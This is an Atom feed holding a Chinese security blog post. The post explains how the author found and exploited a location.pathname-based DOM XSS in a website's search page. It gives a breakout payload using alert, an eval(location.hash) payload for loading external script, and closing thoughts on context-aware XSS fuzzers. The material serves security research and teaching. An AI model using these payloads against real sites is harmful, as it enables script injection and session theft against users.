<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ue</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://magicbluech.github.io/"/>
  <updated>2017-12-01T12:14:05.716Z</updated>
  <id>https://magicbluech.github.io/</id>
  
  <author>
    <name>MagicBlue</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一个xss的利用(location.pathname situation)</title>
    <link href="https://magicbluech.github.io/2017/12/01/%E4%B8%80%E4%B8%AAxss%E7%9A%84%E5%88%A9%E7%94%A8-location-pathname-situation/"/>
    <id>https://magicbluech.github.io/2017/12/01/一个xss的利用-location-pathname-situation/</id>
    <published>2017-12-01T09:39:40.000Z</published>
    <updated>2017-12-01T12:14:05.716Z</updated>
    
    <content type="html"><![CDATA[<p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2017-06-24</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在weibo上看到neargle发了一个<a href="http://www.paulosyibelo.com/2015/04/facebooks-parse-dom-xss.html?m=1" target="_blank" rel="noopener">案例</a>里面是一个location.pathname利用的实际案例。自己原来的想法是这种类型的xss只会存在404页面那边。还有一个问题是$SERVER[‘PHP_SELF’]不进行urlencode,而window.location.pathname则会进行urlencode。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/image.png" alt="image"></p><p>当时就去email to neargle 想探讨下这种类型在实战会怎么利用。</p><p><code>neargle say确实如果用 location.pathname 这个点是会被url编码的，但是也并不是所有的浏览器都会被编码，而且每个浏览器编码的范围不一样，Opera之前的版本是不会编码&quot;和&lt;的。可以参考https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources。而且就算是编码也得看输出的点是什么，要是放在如eval等函数里面还是可以直接利用的。    祝好0v0</code></p><p>其实也就是具体问题具体分析～～运气很好,在做test的时候 恰好遇到了这么一个案例</p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>漏洞发生在搜索框 类似 =&gt; <a href="http://www.xss.com/search/site/search_content。search_content可控" target="_blank" rel="noopener">http://www.xss.com/search/site/search_content。search_content可控</a> 但是它是从location.pathname取出来的。我们只能用特定的几个字符。参考如下(笔者在chrome下进行此次测试)</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/14982740164859.jpg" alt=""></p><p>两个输出点逻辑(输入点 mmmagic)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">_data = &#123;</span><br><span class="line"><span class="string">"level2"</span>: <span class="string">"5"</span>,</span><br><span class="line"><span class="string">"chapter1"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"chapter2"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"chapter3"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"title"</span>: <span class="string">"Internal Search"</span>,</span><br><span class="line"><span class="string">"mc"</span>: <span class="string">"mmmagic"</span>,</span><br><span class="line"><span class="string">"np"</span>: <span class="string">"1"</span>,&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">    &#123;$('#login-info').html('&lt;a href="/</span>p/login.php?p=<span class="regexp">/search/</span>site/mmmagic<span class="string">" target="</span>_blank<span class="string">"&gt;用户登录&lt;/a&gt;&lt;a href="</span>http:<span class="comment">//www//index.php?r=site/ProductPage&amp;PCODE=ZB&amp;utm_medium=online&amp;utm_source=frontpageheader&amp;utm_campaign=zbproductpage&amp;utm_term=tactical" target="_blank"&gt;订阅&lt;/a&gt;');&#125;</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>这个点没有进行合理过滤,所以导致了上面location.pathname可以用的字符我们都可以用。但是也是不太好利用。第一个输出点我没太思考怎么绕过。我把我的思考方式放在后面那个输出点</p><p>我们没办法输入&gt;闭合a 标签 但是由于chrome 很好的容错性它会自动闭合tag 我们可以输入’，所以我们通过’)来闭合$(‘#’).html(‘’) xxxxxxx</p><p>我们已经解决了第一步。但是这样的payload由于语法错误会报错然后不执行。我们要想办法注释后面的点</p><ul><li>通过单行注释 /  但是由于是在pathname里面 我们可以输入/ 但是我们只能输入一个/ 达不到注释的效果</li><li>通过多行注释 /*  但是我们不可以输入}。来闭合前面的{</li></ul><p>以上两种方法均不能达到我们注释的目标(由于chrome在location.pathname支持的字符相比于其余主流浏览器支持的字符最少。所以只要chrome完美bypass。其余浏览器也没有问题了)</p><p>javascript 语法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = (<span class="string">'mmmagic"23333'</span>)</span><br><span class="line"> <span class="string">"mmmagic"</span><span class="number">23333</span><span class="string">"</span></span><br></pre></td></tr></table></figure><p> 既然我们不能注释后面 由于后面的字符原本是在(‘’) 里面的 经过前面的闭合 这个时候为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#'</span>).html(<span class="string">'&lt;a href="/p/login.php?p=/search/site/'</span>)mmmagic<span class="string">" target="</span>_blank<span class="string">"&gt;用户登录&lt;/a&gt;&lt;a href="</span>http:<span class="comment">//www.//index.php?r=site/ProductPage&amp;PCODE=ZB&amp;utm_medium=online&amp;utm_source=frontpageheader&amp;utm_campaign=&amp;utm_term=tactical" target="_blank"&gt;xx&lt;/a&gt;');</span></span><br></pre></td></tr></table></figure><p>所以我们只需要把后面当作是一个string 赋值给一个变量就ok了</p><p>alert payload</p><p><a href="http://www.xss.com/search/site/&#39;)-alert(/mmmagic/);x=(&#39;mmmmagic" target="_blank" rel="noopener">http://www.xss.com/search/site/&#39;)-alert(/mmmagic/);x=(&#39;mmmmagic</a>,<br><img src="http://p0a5v6dfs.bkt.clouddn.com/14982756410400.jpg" alt=""></p><p>这个时候我们已经可以弹窗了。我们要朝着我们的终极目标前进,引入外部的js。这个时候已经很简单了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search/site/')-eval(location.hash.substr(1));x=('mmmmagic,#  +js  方法不唯一</span><br></pre></td></tr></table></figure><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>用户的输入点都是不可信的，所以过滤就显得尤为重要了。web的思考思维是怎么绕过,这其中一块就是具体问题具体分析，往往是看似不可以利用的漏洞。通过几种方式的组合导致可以利用。由于最近一直在思考怎么写xss fuzz tool 所以有一些想法</p><ul><li>传统的xss扫描器 都是基于payload进行fuzz 这样就存在一个问题，检测出来的肯定是存在漏洞。但是由于这种fuzz。它会导致很多可以利用的点会被忽略掉。这大概是由于fuzz tool不够智能吧</li><li>漏洞出现的一个前提是没有过滤 或者是过滤的不充分。但是反过来思考。既然我们没办法构造一个基于大多数的漏洞模型。我们能不能提取出来一些完美的防御过滤模型，只要是符合这个模型的特点。我们就放行，反之就是肯定存在漏洞，这个办法的问题是误报率的问题以及人工成本的增加。人工手动验证的成本会大大增加。但是报着宁杀错杀一千也不放过一个的思维方式，这个是可取的</li><li>打造一个自己的fuzz tool 一定要基于实战 基于漏洞的打磨。但是我们不可以把每种漏洞出现的情况都纳到我们的模型，我们只能通过人工搜集,把一些典型的做成模型。然后让fuzz tools 以后自己分析，我觉得基于语义 基于上下文的fuzz才是未来。</li></ul><p>比如 它有这种智能的检测手段</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">     <span class="built_in">document</span>.path.name(<span class="string">'xxxxxxxxxxx'</span>)；</span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br></pre></td></tr></table></figure><p>如果fuzz tool 发现我们可控的点在xxxxxx处</p><ul><li>它要知道自己是处在js code环境下</li><li>它要知道它要闭合’)//   or  <code>&lt;/script&gt;&lt;img/src=1&gt;</code> or  ‘-alert(1)-‘ 来进行test</li><li>它需要基于语义 自动调整需要闭合的点。</li></ul><p>此刻大概就是这么多想法，要走的路还有很多。但是自己确实是想做出点东西了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[+] Author:MagicBlue&lt;br&gt;[+] Team: NeSE security team&lt;br&gt;[+] From: &lt;a href=&quot;https://magicbluech.github.io&quot;&gt;https://magicbluech.github.io&lt;/
      
    
    </summary>
    
    
  </entry>
  
</feed>
